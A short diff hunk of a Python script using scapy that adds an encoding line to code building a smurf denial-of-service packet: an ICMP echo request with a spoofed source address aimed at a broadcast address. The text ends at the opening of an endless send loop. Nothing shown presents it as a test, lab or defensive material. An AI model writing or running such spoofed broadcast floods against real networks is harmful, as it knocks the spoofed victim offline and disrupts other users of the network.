@@ -1,3 +1,4 @@
+# -*- coding:utf-8 -*-
 from scapy.all import *
 pkt_smurf=IP(src='192.168.1.2',dst='192.168.255.255')/ICMP(type=8)
 while True:
